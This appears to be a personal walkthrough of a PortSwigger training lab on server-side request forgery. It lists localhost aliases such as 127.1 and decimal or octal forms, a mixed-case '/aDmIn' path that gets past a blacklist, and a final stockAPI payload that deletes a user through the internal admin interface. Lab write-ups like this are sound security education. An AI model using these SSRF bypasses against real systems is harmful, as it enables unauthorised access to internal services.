https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

1) try to access /admin and we obtain a message that says that the page can be accessed only by administrators or from the loopback


2) perform a request to see if a product is in the stock to  POST /product/stock

    we can see that this performs a request to an API 

    so change the endpoint of the api in the body to:
    stockAPI=http://localhost
    
    BUT we obtain "External stock check blocked for security reasons"

    so try to fuzz the possible alias for localhost with 
    127.0.0.1
    2130706433
    017700000001
    127.1
    localhost

    127.1 works

3) try to access to the admin panel /admin changing the POST body to
    stockAPI=http://127.1/admin
    
    BUT we obtain "External stock check blocked for security reasons"

    so try:
    
    stockAPI=http://127.1/aDmIn
    
    it works


4) delete carlos 
    stockAPI=http://127.1/aDmIn/delete?username=carlos
    


